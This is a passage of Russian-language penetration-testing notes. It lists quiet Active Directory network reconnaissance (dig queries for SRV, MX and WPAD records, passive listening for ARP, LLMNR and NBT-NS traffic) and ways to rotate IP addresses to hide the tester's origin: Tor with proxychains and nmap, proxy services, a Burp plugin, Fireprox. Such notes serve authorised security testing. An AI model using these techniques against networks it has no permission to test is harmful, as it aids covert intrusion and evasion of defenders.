  + Какие подходы могут помочь нам исследовать сеть и определиться в пути компрометации:
    + Обращаться только к тем сервисам, с которыми работают пользователи в сети.
    + Исследовать DNS имена в трафике и в домене, пытаясь обнаружить наиболее интересные машины в сети.
      + Опросить DNS на предмет корневых доменных имен: `dig domain.local`
      + Опросить домен на предмет записей о сервисах в домене:
        + `dig -t SRV _gc._tcp.domain.local`
        + `dig -t SRV _ldap._tcp.domain.local`
        + `dig -t SRV _kerberos._tcp.domain.local`
        + `dig -t SRV _kpasswd._tcp.domain.local`
      + Попытаться обратиться к общедоступным ресурсам, типа почты, сервера LDAP, сервера, WPAD прокси.
        + `dig -t MX domain.local`
        + `dig -t wpad.domain.local`
    + Исследовать ARP запросы в сети, для того чтобы пассивно собирать информацию об участниках сети.
      + Исследовать трафик сети на предмет широковещательного трафика: ARP, mDNS, LLMNR, NBTNS и пр.
    + Обращаться к общедоступным ресурсам в домене. 
    + При сканировании сервисов использовать подключение только к отдельным портам без флагов активного сканирования.
+ Ротация IP
  + Tor
    + `sudo apt install proxychains tor -y` - установка
    + `service tor start` - Запуск сервиса Tor на порту стандартном порту 9050
    + `vim /etc/proxychains4.conf` - Настройка Proxychains в файле конфигурации
    + `proxychains nmap -targetaddress` - Запуск утилиты Nmap с использованием proxy Tor
  + Сервисы:
    + https://www.proxyrotator.com/ 
    + https://stormproxies.com/ 
    + https://brightdata.com/
  + Плагин для BurpSuite
    + [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
  + Консольные утилиты:
    + [Fireprox](https://github.com/ustayready/fireprox)












